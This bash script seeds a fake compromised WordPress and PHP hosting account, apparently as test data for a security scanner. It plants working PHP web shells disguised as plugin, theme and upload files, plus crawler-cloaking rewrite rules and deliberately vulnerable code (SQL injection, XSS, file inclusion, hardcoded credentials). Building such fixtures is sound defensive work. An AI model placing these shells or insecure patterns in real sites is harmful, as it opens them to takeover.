#!/bin/bash
# Builds a fake infected cPanel account at /home/ssftest for testing (run as root in a throwaway container).
# Everything in it is harmless test data; the keys are made-up strings assembled at run time.
rm -rf /home/ssftest; B=/home/ssftest/public_html; S=$B/site1
mkdir -p $S/wp-includes $S/wp-admin $S/results $S/about $S/.tmb $S/wp-content/{mu-plugins,themes/mytheme,uploads/2024/03,uploads/redux} $S/wp-content/plugins/{akismet,premium-thing,file-manager-advanced} $B/site2 /home/ssftest/ssf-data
cd $S
echo '<?php $wp_version = "6.5.2";' > wp-includes/version.php
echo '<?php // functions' > wp-includes/functions.php
echo '<?php // load HACKED' > wp-includes/load.php
echo '<?php // harmless leftover' > wp-includes/old-leftover.php
: > wp-admin/wp-admin.php
{ echo '<?php'; echo 'error_reporting(0);'; for i in $(seq 1 400); do echo '$z .= "QUJD";'; done; echo '$a = "base"; $b = "64_decode"; $c = $a.$b; eval($c($z));'; } > wp-includes/class-wp-evil-editor.php
echo '<?php require __DIR__ . "/wp-blog-header.php";' > index.php
echo '<?php // blog header' > wp-blog-header.php
printf '<?php\ndefine("DB_NAME","x");\ndefine("DB_USER","x");\ndefine("DB_PASSWORD","x");\ndefine("DB_HOST","127.0.0.1:1");\n$table_prefix="wp_";\nrequire_once ABSPATH . "wp-settings.php";\n' > wp-config.php
cp wp-config.php wp-config.php.bak; cp wp-config.php $B/site2/
echo '<html><title>OLXTOGEL</title><body>slot gacor maxwin situs slot togel</body>' > results/index.php
echo '<html><title>About</title><body>hello</body>' > about/index.html
printf '# BEGIN LSCACHE\r\n# END LSCACHE\r\n\r\n# --- BOT RULES ---\r\n<IfModule mod_rewrite.c>\r\nRewriteEngine On\r\n<IfModule LiteSpeed>\r\n    CacheDisable public /\r\n</IfModule>\r\nRewriteCond %%{HTTP_USER_AGENT} (googlebot|bingbot) [NC]\r\nRewriteCond %%{REQUEST_URI} ^/$\r\nRewriteRule ^$ /wp-setting.html [L,R=301]\r\n</IfModule>\r\n\r\n# BEGIN WordPress\r\n<IfModule mod_rewrite.c>\r\nRewriteEngine On\r\nRewriteCond %%{HTTP_USER_AGENT} !^(facebookexternalhit).* [NC]\r\nRewriteRule . /index.php [L]\r\n</IfModule>\r\n# END WordPress\r\n' > .htaccess
cp .htaccess /home/ssftest/ht.orig
echo 'google-site-verification: googleabcdef1234567890.html' > googleabcdef1234567890.html
head -c 2000000 /dev/urandom > backup.zip
: > setup.php
echo '<?php if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);} ?><form enctype="multipart/form-data" method="post"><input type="file" name="f"></form>' > x.php
P=wp-content/plugins
printf '<?php\n/*\nPlugin Name: Akismet Anti-spam\nVersion: 5.3\n*/\n' > $P/akismet/akismet.php
echo '<?php // class ok' > $P/akismet/class.akismet.php
echo '<?php eval(base64_decode($_POST["x"]));' > $P/akismet/d8dee896.php
printf '<?php\n/*\nPlugin Name: Premium Thing\nVersion: 2.0\n*/\n$r = eval($code);\n' > $P/premium-thing/premium-thing.php
echo '<?php // fm' > $P/file-manager-advanced/fm.php
head -c 1500000 /dev/urandom > $P/loose.zip
echo '<?php $_GET["a"]($_GET["b"]);' > wp-content/uploads/2024/03/shell.php
echo '<?php // redux ext' > wp-content/uploads/redux/a.php
printf '\xff\xd8\xff<?php echo 1;' > wp-content/uploads/pic.jpg
echo '<?php // unknown mu' > wp-content/mu-plugins/strange.php
printf '<?php\n// theme functions\neval(base64_decode("ZWNobyAxOw=="));\n' > wp-content/themes/mytheme/functions.php
# seeded official checksums (network is blocked in the sandbox)
D=/home/ssftest/ssf-data
php -r '$m=["index.php"=>md5_file("index.php"),"wp-blog-header.php"=>md5_file("wp-blog-header.php"),"wp-includes/version.php"=>md5_file("wp-includes/version.php"),"wp-includes/functions.php"=>md5_file("wp-includes/functions.php"),"wp-includes/load.php"=>md5("orig")]; file_put_contents("'$D'/cache-core-6.5.2-en_US.json",json_encode($m));
$p=["akismet.php"=>[md5_file("wp-content/plugins/akismet/akismet.php")],"class.akismet.php"=>[md5("orig")]]; file_put_contents("'$D'/cache-plug-akismet-5.3.json",json_encode($p));'
# ---- a hand-built ("vibe-coded") site next to the WordPress ones
V=$B/shop; mkdir -p $V/.git $V/assets $V/vendor/phpunit/phpunit/src/Util/PHP $V/api $V/uploads
cd $V
echo 'ref: refs/heads/main' > .git/HEAD
printf 'DB_PASSWORD=supersecret123\nSTRIPE_SECRET=%s\n' "sk_""live_abcdefghijklmnopqrstuvwx" > .env
printf 'APP_NAME=shop\n' > .env.example
cat > index.php <<'P'
<?php
$db = mysqli_connect("localhost", "u", "p", "d");
echo "<h1>Results for " . $_GET['q'] . "</h1>";
$r = mysqli_query($db, "SELECT * FROM products WHERE id = " . $_GET['id']);
$name = $_POST['name'] ?? '';
$sql = "SELECT * FROM products WHERE name = '$name'";
include $_GET['page'] . ".php";
header("Location: " . $_GET['next']);
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post"><input name="name"></form>
P
cat > login.php <<'P'
<?php
session_start();
if ($_POST['password'] == 'admin123') { $_SESSION['admin'] = true; }
$hash = md5($password);
?>
<form method="POST"><input type="password" name="password"></form>
P
cat > upload.php <<'P'
<?php
if (isset($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']); }
P
cat > safe.php <<'P'
<?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
$r = mysqli_query($db, "SELECT * FROM t WHERE id = " . intval($_GET['id']));
$page = in_array($_GET['page'], ['home', 'about']) ? $_GET['page'] : 'home';
P
cp index.php config.php.bak
echo '<?php phpinfo(); ?>' > info.php
echo '<?php // Adminer' > adminer.php
head -c 6000 /dev/urandom | base64 > dump.sql
echo '<?php eval("?>" . file_get_contents("php://stdin"));' > vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
echo 'PHP Warning: x in /home/u/public_html/shop/index.php' > error_log
J=$(python3 -c "import base64,json;h=base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}').decode().rstrip('=');p=base64.urlsafe_b64encode(json.dumps({'iss':'supabase','role':'service_role','iat':1700000000}).encode()).decode().rstrip('=');print(h+'.'+p+'.abcdefghijklmnopqrstuvwxyz0123456789ABCDEF')")
OK="sk-""proj-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcd"
cat > app.js <<P
const OPENAI_KEY = "$OK";
const supabase = createClient('https://abcdefghij.supabase.co', '$J');
function login() {
  const password = document.getElementById('pw').value;
  if (password === "letmein2024") { window.location = 'admin.html'; }
}
document.getElementById('msg').innerHTML = location.hash.slice(1);
P
printf 'var a=1;%s;var k="%s";' "$(head -c 3000 /dev/zero | tr '\0' 'x')" "AKIA""IOSFODNN7EXAMPLE" > assets/index-abc123.min.js
printf 'const express = require("express");\nconst db = process.env.DB;\n' > api/server.js
printf 'from flask import Flask\napp = Flask(__name__)\napp.run(debug=True)\n' > api/app.py
echo hi > uploads/notes.txt; chmod 666 uploads/notes.txt; chmod 777 uploads
